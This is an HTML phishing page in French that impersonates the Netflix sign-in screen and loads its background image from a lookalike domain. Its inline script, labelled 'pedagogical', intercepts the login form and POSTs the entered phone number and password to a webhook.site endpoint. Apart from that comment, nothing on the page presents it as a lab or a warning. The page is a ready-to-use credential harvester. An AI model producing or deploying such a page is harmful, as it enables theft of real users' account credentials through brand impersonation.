<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>NETFLIX - Connexion</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #000;
      color: #fff;
    }
    .hero {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: url("https://nesflix.uk/bgimage.jpg") center/cover no-repeat;
      position: relative;
    }
    .hero::before {
      content: "";
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.65);
    }
    .hero-content {
      position: relative;
      text-align: center;
      z-index: 2;
      margin-bottom: 20px;
    }
    .brand {
      color: #e50914;
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .subtitle {
      font-size: 1rem;
      font-weight: normal;
      margin: 0;
      color: #ddd;
    }
    .login-card {
      position: relative;
      z-index: 2;
      width: 320px;
      background: rgba(0, 0, 0, 0.75);
      padding: 30px 20px;
      border-radius: 8px;
    }
    .login-card h2 {
      margin: 0 0 20px;
      text-align: center;
      font-size: 1.3rem;
    }
    .input-group {
      display: flex;
      align-items: center;
      background: #333;
      border-radius: 4px;
      padding: 12px;
      margin-bottom: 15px;
      position: relative;
    }
    .input-group svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      fill: #aaa;
    }
    .input-group input {
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      margin-left: 10px;
      flex: 1;
      font-size: 1rem;
    }
    .input-group input::placeholder {
      color: #888;
    }
    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      background: #e50914;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      margin: 20px 0 10px;
    }
    .card-footer {
      text-align: center;
      font-size: 0.9rem;
      color: #ccc;
    }
    .card-footer a {
      color: #e50914;
      text-decoration: none;
      font-weight: bold;
    }
    .site-footer {
      position: relative;
      z-index: 2;
      text-align: center;
      color: rgba(255, 255, 255, 0.7);
      font-size: 0.8rem;
      padding: 30px 10px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <main class="hero">
    <div class="hero-content">
      <div class="brand">NETFLIX</div>
      <p class="subtitle">Connectez-vous avec votre numéro de téléphone</p>
    </div>

    <section class="login-card">
      <h2>Se connecter</h2>
      <form>
        <!-- Téléphone -->
        <div class="input-group">
          <input type="tel" placeholder="Numéro de téléphone">
        </div>
        <!-- Mot de passe -->
        <div class="input-group">
          <input type="password" placeholder="Mot de passe">
        </div>
        <button class="btn">Se connecter</button>
      </form>
      <div class="card-footer">
        Vous n'avez pas de compte ? <a href="#">S'inscrire maintenant</a>
      </div>
    </section>

    <footer class="site-footer">
      © 2025 Netflix International. Tous droits réservés.
    </footer>
  </main>

  <!-- Script pédagogique -->
  <script>
  document.querySelector("form").addEventListener("submit", function(e) {
    e.preventDefault();

    const tels = document.querySelector('input[type="tel"]').value;
    const passwords = document.querySelector('input[type="password"]').value;

    fetch("https://webhook.site/28bc5f45-a231-4b01-aef2-40b14fd23775", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify({
        tels: tels,
      passwords: passwords
      })
    })
    .then(() => alert("Données envoyées au webhook !"))
    .catch(err => console.error("Erreur :", err));
  });
  </script>
</body>
</html>
